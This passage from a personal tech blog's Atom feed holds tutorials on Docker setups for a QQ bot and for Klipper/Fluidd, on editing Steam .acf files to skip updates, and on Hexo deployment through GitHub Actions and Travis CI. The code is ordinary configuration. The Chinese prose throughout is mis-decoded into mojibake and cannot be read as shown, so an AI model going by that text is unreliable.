class="string">POSTGRES_PASSWORD=zxbot</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_DB=zxbot_database</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres_data:/var/lib/postgresql/data</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">bot:</span> <span class="comment">#éœ€è¦å°† .env.dev ä¸­çš„ç›‘å¬åœ°å€æ”¹ä¸º0.0.0.0</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ghcr.io/d9lab/zhenxun_bot:latest</span> <span class="comment">#ghcr.io</span></span><br><span class="line">    <span class="comment">#image: d9lab01/zhenxun_bot #DockerHub</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zxbot_zhenxun_bot</span></span><br><span class="line">    <span class="attr">depends_on:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SU=114514</span> <span class="comment">#ç®¡ç†å‘˜QQ</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB=postgres://zxbot:zxbot@postgres:5432/zxbot_database</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bot_data:/bot</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres:postgres</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span> </span><br><span class="line">  <span class="attr">bot_data:</span></span><br><span class="line">  <span class="attr">go-cqhttp_data:</span></span><br><span class="line">  <span class="attr">postgres_data:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é•œåƒæœ‰é—®é¢˜äº†å¼€issueï¼Œçœ‹è§äº†å°±å›ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æŒ‡è·¯&quot;&gt;&lt;a href=&quot;#æŒ‡è·¯&quot; class=&quot;headerlink&quot; title=&quot;æŒ‡è·¯&quot;&gt;&lt;/a&gt;æŒ‡è·¯&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/D9Lab/zhenxun_bot_docker&quot;&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨Dockerä¸­è¿è¡ŒKlipper</title>
    <link href="https://thinkalone.win/klipper-docker.html"/>
    <id>https://thinkalone.win/klipper-docker.html</id>
    <published>2022-01-25T04:00:00.000Z</published>
    <updated>2022-01-25T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…Portainer"><a href="#å®‰è£…Portainer" class="headerlink" title="å®‰è£…Portainer"></a>å®‰è£…Portainer</h1><p><a href="https://docs.portainer.io/v/ce-2.11/start/install">https://docs.portainer.io/v/ce-2.11/start/install</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker volume create portainer_data</span><br><span class="line">docker run -d -p 9443:9443 --name portainer \</span><br><span class="line">--restart=always \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">-v portainer_data:/data \</span><br><span class="line">portainer/portainer-ce:lts</span><br></pre></td></tr></table></figure><h1 id="å»ºç«‹Stacksï¼ˆdocker-composeï¼‰"><a href="#å»ºç«‹Stacksï¼ˆdocker-composeï¼‰" class="headerlink" title="å»ºç«‹Stacksï¼ˆdocker-composeï¼‰"></a>å»ºç«‹Stacksï¼ˆdocker-composeï¼‰</h1><p><a href="https://github.com/dimalo/klipper-web-control-docker">https://github.com/dimalo/klipper-web-control-docker</a></p><p>æ‰“å¼€Stacksï¼ŒAdd stack ç²˜è´´ä»¥ä¸‹ä»£ç </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">klipper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">dimalo/klipper-moonraker</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">klipper</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">7125</span><span class="string">:7125</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">gcode_files:/home/klippy/gcode_files</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">klipper_data:/home/klippy/.config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">moonraker_data:/home/klippy/.moonraker</span></span><br><span class="line">    <span class="attr">devices:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/dev/serial/by-id/usb-1a86_USB_Serial-if00-port0:/dev/ttyUSB0</span> <span class="comment">#æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">fluidd:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">dimalo/fluidd</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">fluidd</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8010</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">depends_on:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">klipper</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">klipper:klipper</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span> </span><br><span class="line">  <span class="attr">gcode_files:</span></span><br><span class="line">  <span class="attr">moonraker_data:</span></span><br><span class="line">  <span class="attr">klipper_data:</span></span><br></pre></td></tr></table></figure><p>è®¿é—® <code>http://&#123;IP&#125;:8010</code> å³å¯çœ‹åˆ°fluidd</p><h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><p><code>1.fluiddæ˜¾ç¤ºæ— æ³•è¿æ¥...</code></p><p>è¯¥é•œåƒè‡ªå¸¦äº†å¯åŠ¨æ—¶æ£€æŸ¥æ›´æ–°ï¼ŒæŸ¥çœ‹Container <code>klipper</code> çš„æ—¥å¿—å¯ä»¥çœ‹åˆ°å¯åŠ¨å¡åœ¨äº†git pullä¸Šï¼Œç­‰ä¸€æ®µæ—¶é—´æˆ–è€…è‡ªè¡Œè§£å†³ã€‚</p><p><code>2.æ— æ³•åœ¨ç½‘é¡µé‡å¯klipper</code></p><p>åº”ç›´æ¥é‡å¯å¯¹åº”Container</p><p><code>3.ä¸Šä¼ æ–‡ä»¶åå¯ä»¥ä¸ºä¸­æ–‡ï¼Œä½†æ˜¯æ‰“å°æ—¶å¿…é¡»æ¢æˆè‹±æ–‡</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å®‰è£…Portainer&quot;&gt;&lt;a href=&quot;#å®‰è£…Portainer&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…Portainer&quot;&gt;&lt;/a&gt;å®‰è£…Portainer&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://docs.portainer.io</summary>
      
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•ä¼˜é›…çš„è·³è¿‡/ç¦æ­¢Steamæ›´æ–°ä½ çš„æ¸¸æˆ</title>
    <link href="https://thinkalone.win/skip-steam-update.html"/>
    <id>https://thinkalone.win/skip-steam-update.html</id>
    <published>2021-01-22T13:00:00.000Z</published>
    <updated>2021-01-22T13:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/pictures/skip-steam-update/head.png" alt="head"></p><p>ä¹°äº†ä¸ªBeatsaberï¼Œ æ¯æ¬¡Steamæ›´æ–°æ¸¸æˆéƒ½ä¼šè®©è‡ªå·±è£…çš„æ’ä»¶å¤±æ•ˆï¼Œè€Œä¸æ›´æ–°åˆæ²¡æ³•å¯åŠ¨æ¸¸æˆâ€¦â€¦</p><span id="more"></span><h2 id="1-å…³é—­è‡ªåŠ¨æ›´æ–°"><a href="#1-å…³é—­è‡ªåŠ¨æ›´æ–°" class="headerlink" title="1.å…³é—­è‡ªåŠ¨æ›´æ–°"></a>1.å…³é—­è‡ªåŠ¨æ›´æ–°</h2><p>è¿™ä¸ªåº”è¯¥ä¸ç”¨è¯´äº†ï¼Œé˜²æ­¢è¢«SteamæŠ¢å…ˆæ›´æ‰ã€‚</p><pre><code>åœ¨Steamä¸­ æ¸¸æˆ -ã€‹ å³é”®å±æ€§ -ã€‹ æ›´æ–° -ã€‹ è‡ªåŠ¨æ›´æ–° -ã€‹ åªåœ¨æˆ‘å¯åŠ¨æ—¶æ›´æ–°æ­¤æ¸¸æˆ</code></pre><h2 id="2-æ‰¾åˆ°æ¸¸æˆå¯¹åº”çš„acfæ–‡ä»¶"><a href="#2-æ‰¾åˆ°æ¸¸æˆå¯¹åº”çš„acfæ–‡ä»¶" class="headerlink" title="2.æ‰¾åˆ°æ¸¸æˆå¯¹åº”çš„acfæ–‡ä»¶"></a>2.æ‰¾åˆ°æ¸¸æˆå¯¹åº”çš„acfæ–‡ä»¶</h2><p>åœ¨Steamå•†åº—æ‰¾åˆ°ä½ çš„æ¸¸æˆï¼Œå¤åˆ¶URL<code>/app/</code>åçš„ä¸€ä¸²æ•°å­—ï¼Œè¿™æ˜¯æ¸¸æˆçš„<code>appid</code>ã€‚</p><p><img src="/pictures/skip-steam-update/findfile.png" alt="findfile"></p><p>ç›´æ¥ç”¨æ–‡ä»¶ç®¡ç†å™¨æœç´¢<code>appid</code>ï¼Œæ‰¾åˆ°æ‰©å±•åä¸ºacfçš„æ–‡ä»¶ï¼Œä»¥æˆ‘è¦ä¿®æ”¹çš„Beatsaberä¸ºä¾‹ï¼š</p><p>ç„¶åç”¨ä½ å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€acfæ–‡ä»¶</p><h2 id="3-åœ¨Steamdbæ‰¾æ•°æ®"><a href="#3-åœ¨Steamdbæ‰¾æ•°æ®" class="headerlink" title="3.åœ¨Steamdbæ‰¾æ•°æ®"></a>3.åœ¨Steamdbæ‰¾æ•°æ®</h2><p>æ‰“å¼€ <a href="https://steamdb.info/">Steamdb</a> ï¼ŒæŠŠ<code>appid</code>ç²˜è´´è¿›å»ã€‚</p><p><img src="/pictures/skip-steam-update/search.png" alt="search"></p><p>æ‰“å¼€<code>History</code>æ ‡ç­¾</p><p><img src="/pictures/skip-steam-update/history.png" alt="history"></p><p>æ‰¾åˆ°<code>timeupdated</code> <code>buildid</code> <code>maxsize</code> <code>manifests</code>ï¼Œå¹¶è®°ä¸‹ç»¿è‰²é«˜äº®çš„æ•°å€¼ã€‚</p><p><img src="/pictures/skip-steam-update/changelist.png" alt="changelist"></p><h2 id="4-ä¿®æ”¹acfæ–‡ä»¶"><a href="#4-ä¿®æ”¹acfæ–‡ä»¶" class="headerlink" title="4.ä¿®æ”¹acfæ–‡ä»¶"></a>4.ä¿®æ”¹acfæ–‡ä»¶</h2><h3 id="ä¿®æ”¹å‰è¦å…ˆå®Œå…¨å…³é—­steam"><a href="#ä¿®æ”¹å‰è¦å…ˆå®Œå…¨å…³é—­steam" class="headerlink" title="ä¿®æ”¹å‰è¦å…ˆå®Œå…¨å…³é—­steam"></a>ä¿®æ”¹å‰è¦å…ˆå®Œå…¨å…³é—­steam</h3><p><img src="/pictures/skip-steam-update/modify.png" alt="modify"></p><p>å°†<code>StateFlags</code>æ”¹ä¸º<code>4</code>ï¼Œç„¶åå°†ä¸Šé¢å¤åˆ¶çš„å€¼ä¸€ä¸€å¯¹åº”è¦†ç›–åŸæ¥çš„å€¼ã€‚</p><pre><code>timeupdated -&gt; LastUpdatedbuildid -&gt; buildidmanifests -&gt; manifestmaxsize -&gt; size</code></pre><p>ä¿å­˜åå†å¯åŠ¨steamï¼Œå®Œæˆ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/pictures/skip-steam-update/head.png&quot; alt=&quot;head&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¹°äº†ä¸ªBeatsaberï¼Œ æ¯æ¬¡Steamæ›´æ–°æ¸¸æˆéƒ½ä¼šè®©è‡ªå·±è£…çš„æ’ä»¶å¤±æ•ˆï¼Œè€Œä¸æ›´æ–°åˆæ²¡æ³•å¯åŠ¨æ¸¸æˆâ€¦â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ GitHub Actions è‡ªåŠ¨éƒ¨ç½²Hexo</title>
    <link href="https://thinkalone.win/hexo-on-action.html"/>
    <id>https://thinkalone.win/hexo-on-action.html</id>
    <published>2020-12-26T13:00:00.000Z</published>
    <updated>2020-12-26T13:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/pictures/hexo-on-action/head.png"></p><p>2019å¹´æ—¶ç»™åšå®¢é…ç½®äº†Travis CI è‡ªåŠ¨æ„å»ºï¼Œç„¶åå‰å‡ å¤©å‡†å¤‡å‘ä¸ªæ–‡ç« ï¼Œå†™å®Œåæ‰‹ä¸€ä¸ª<code>git push</code>åšå®¢å°±å´©äº†ã€‚</p><span id="more"></span><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>é¦–å…ˆä½ çš„Hexoå¿…é¡»æ˜¯å·²ç»åœ¨æœ¬åœ°ç¯å¢ƒä¸‹é…ç½®å¥½çš„ï¼Œèƒ½æ­£å¸¸è¿è¡Œ<code>hexo g</code>ã€‚</p><h2 id="ç”Ÿæˆ-é…ç½®ç§˜é’¥"><a href="#ç”Ÿæˆ-é…ç½®ç§˜é’¥" class="headerlink" title="ç”Ÿæˆ&amp;é…ç½®ç§˜é’¥"></a>ç”Ÿæˆ&amp;é…ç½®ç§˜é’¥</h2><p>ä½¿ç”¨<code>ssh-keygen</code>ç”Ÿæˆä¸€å¯¹ç§˜é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C &quot;Hexo Deploy Key&quot; -f github-deploy-key</span><br></pre></td></tr></table></figure><p>ç›´æ¥å›è½¦ï¼Œä¸è¦è®¾ç½®å¯†ç </p><p>åœ¨ GitHub ä¸Šæ‰“å¼€<code>ä»“åº“-&gt; Settings -&gt; Secrets</code>æ·»åŠ ä¸€ä¸ªSecretsï¼Œ<code>Name</code>å¡«<code>HEXO_DEPLOY_KEY</code>ï¼Œ<code>Value</code>æŠŠä¸Šé¢ç”Ÿæˆçš„<strong>ç§é’¥</strong>ç²˜è´´è¿›å»</p><p><img src="/pictures/hexo-on-action/new.png"></p><p><img src="/pictures/hexo-on-action/new-ok.png"></p><p>æ‰“å¼€<code>ä»“åº“-&gt; Settings -&gt; Deploy keys</code>æ·»åŠ ä¸€ä¸ªKeyï¼Œ<code>Title</code>å¡«<code>HEXO_DEPLOY_PUB</code>ï¼Œ<code>Key</code>æŠŠä¸Šé¢ç”Ÿæˆçš„<strong>å…¬é’¥</strong>ç²˜è´´è¿›å»ï¼Œå‹¾é€‰ä¸‹é¢çš„<code>Allow write access</code></p><p><img src="/pictures/hexo-on-action/new-key.png"></p><h2 id="å‡†å¤‡æ–‡ä»¶"><a href="#å‡†å¤‡æ–‡ä»¶" class="headerlink" title="å‡†å¤‡æ–‡ä»¶"></a>å‡†å¤‡æ–‡ä»¶</h2><p>åˆ›å»ºä¸€ä¸ªç©ºçš„åˆ†æ”¯ï¼Œä»åŸæœ‰çš„hexoæºæ–‡ä»¶ç›®å½•ä¸‹æ‹·è´è¿™äº›æ–‡ä»¶&amp;æ–‡ä»¶å¤¹ï¼š</p><ul><li><input checked="" disabled="" type="checkbox"> scaffolds</li><li><input checked="" disabled="" type="checkbox"> source</li><li><input checked="" disabled="" type="checkbox"> themes</li><li><input checked="" disabled="" type="checkbox"> _config.ymlï¼ˆhexoçš„ï¼‰</li><li><input checked="" disabled="" type="checkbox"> package.json</li></ul><h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><p>ä¸ºäº†é˜²æ­¢ä»¥åç”±äºé•¿æ—¶é—´æœªç»´æŠ¤ï¼Œä¸»é¢˜æˆ–hexoæ›´æ–°å¯¼è‡´çš„åšå®¢ç‚¸æ‰ï¼Œæ‰€ä»¥é…ç½®ä¸»é¢˜ä¸ºsubmoduleã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add https://github.com/JoeyBling/hexo-theme-yilia-plus themes/yilia</span><br></pre></td></tr></table></figure><p>åœ¨_config.ymlçš„æœ€åæ·»åŠ ä¸€é¡¹<code>theme_config:</code></p><p>å‚è€ƒï¼š<a href="https://blog.xxwhite.com/2020/blog-ci.html#%E4%B8%BB%E9%A2%98%E5%AD%90%E6%A8%A1%E5%9D%97%E5%8C%96">https://blog.xxwhite.com/2020/blog-ci.html#%E4%B8%BB%E9%A2%98%E5%AD%90%E6%A8%A1%E5%9D%97%E5%8C%96</a></p><p><img src="/pictures/hexo-on-action/config.png"></p><h2 id="é…ç½®Workflow"><a href="#é…ç½®Workflow" class="headerlink" title="é…ç½®Workflow"></a>é…ç½®Workflow</h2><p>åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼š<code>.github/workflows/deploy.yml</code></p><figure class="highlight yaml"><figcaption><span>.github&#x2F;workflows&#x2F;deploy.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">source</span>                          <span class="comment">#è¢«ç›‘æ§çš„åˆ†æ”¯ï¼Œå½“è¿™ä¸ªåˆ†æ”¯æœ‰æ”¹åŠ¨æ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">if:</span> <span class="string">github.event.repository.owner.id</span> <span class="string">==</span> <span class="string">github.event.sender.id</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">source</span>                   <span class="comment">#hexoæºæ–‡ä»¶æ‰€åœ¨çš„åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;12&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">ACTION_DEPLOY_KEY:</span> <span class="string">$</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$ACTION_DEPLOY_KEY&quot; &gt; ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="string">          chmod 700 ~/.ssh</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;disappear9@outlook.com&quot;   #è®¾ç½®gitæäº¤æ—¶çš„Email</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;Disappear9&quot;                #è®¾ç½®gitæäº¤æ—¶çš„ç”¨æˆ·å</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string">          git submodule update --init --recursive                   #æ‹‰å–submodule</span></span><br><span class="line"><span class="string">          rm themes/yilia/_config.yml                               #åˆ é™¤ä¸»é¢˜è‡ªå¸¦çš„é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="string">          chmod +x deploy.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          hexo g</span></span><br><span class="line"><span class="string">          ./deploy.sh</span></span><br></pre></td></tr></table></figure><p>ç”±äºä½¿ç”¨<code>hexo d</code>éƒ¨ç½²ä¼šè®©gitçš„commitçœ‹èµ·æ¥å¾ˆä¸‘ï¼Œæ‰€ä»¥æŠŠéƒ¨ç½²å†™è¿›è„šæœ¬<code>deploy.sh</code>ï¼ˆæ”¾åœ¨æ–°å»ºåˆ†æ”¯çš„æ ¹ç›®å½•ä¸‹ï¼‰</p><figure class="highlight bash"><figcaption><span>deploy.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -ev</span><br><span class="line"><span class="built_in">export</span> TZ=<span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 -b master git@github.com:&#123;ç”¨æˆ·å&#125;/&#123;ä»“åº“&#125;.git .deploy_git    <span class="comment">#è‡ªå·±æ›¿æ¢</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .deploy_git</span><br><span class="line">git checkout master</span><br><span class="line"><span class="built_in">mv</span> .git/ ../public/</span><br><span class="line"><span class="built_in">cd</span> ../public</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;Site updated: `date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;`&quot;</span></span><br><span class="line">git push origin master:master --force </span><br></pre></td></tr></table></figure><h2 id="åŠ ä¸ªBadge"><a href="#åŠ ä¸ªBadge" class="headerlink" title="åŠ ä¸ªBadge"></a>åŠ ä¸ªBadge</h2><p><a href="https://github.com/Disappear9/disappear9.github.io/tree/source"><img src="https://github.com/Disappear9/disappear9.github.io/workflows/Hexo%20Deploy/badge.svg" alt="Build Status"></a></p><p>å‚è€ƒï¼š<a href="https://docs.github.com/cn/actions/managing-workflow-runs/adding-a-workflow-status-badge">https://docs.github.com/cn/actions/managing-workflow-runs/adding-a-workflow-status-badge</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/&lt;OWNER&gt;/&lt;REPOSITORY&gt;/workflows/Hexo%20Deploy/badge.svg</span><br></pre></td></tr></table></figure><h2 id="å®Œ"><a href="#å®Œ" class="headerlink" title="å®Œ"></a>å®Œ</h2><p><a href="https://github.com/Disappear9/disappear9.github.io/tree/source">https://github.com/Disappear9/disappear9.github.io/tree/source</a><br>æ¬¢è¿å‚è€ƒ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/pictures/hexo-on-action/head.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;2019å¹´æ—¶ç»™åšå®¢é…ç½®äº†Travis CI è‡ªåŠ¨æ„å»ºï¼Œç„¶åå‰å‡ å¤©å‡†å¤‡å‘ä¸ªæ–‡ç« ï¼Œå†™å®Œåæ‰‹ä¸€ä¸ª&lt;code&gt;git push&lt;/code&gt;åšå®¢å°±å´©äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Travis CI è‡ªåŠ¨æ„å»º Hexo åšå®¢</title>
    <link href="https://thinkalone.win/Travis-CI-Hexo.html"/>
    <id>https://thinkalone.win/Travis-CI-Hexo.html</id>
    <published>2019-02-06T04:44:30.000Z</published>
    <updated>2019-02-06T04:44:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é…ç½®-GitHub-ä»“åº“"><a href="#é…ç½®-GitHub-ä»“åº“" class="headerlink" title="é…ç½® GitHub ä»“åº“"></a>é…ç½® GitHub ä»“åº“</h2><p><strong>æ³¨æ„ï¼šä»¥ä¸‹å…¨éƒ¨æ“ä½œå°½é‡ä¸è¦åœ¨Windowsç³»ç»Ÿä¸‹æ“ä½œ</strong><br>å»ºç«‹ä¸€ä¸ªsourceåˆ†æ”¯ï¼Œæ”¾å…¥<code>scaffolds</code> <code>source</code> <code>themes</code>æ–‡ä»¶å¤¹å’Œ<code>_config.yml</code> <code>package.json</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir source</span><br><span class="line">cd source</span><br><span class="line">git init</span><br><span class="line">git remote add origin git@github.com:Disappear9/disappear9.github.io.git</span><br><span class="line">git checkout --orphan source</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Initial commit&quot;</span><br><span class="line">git push origin 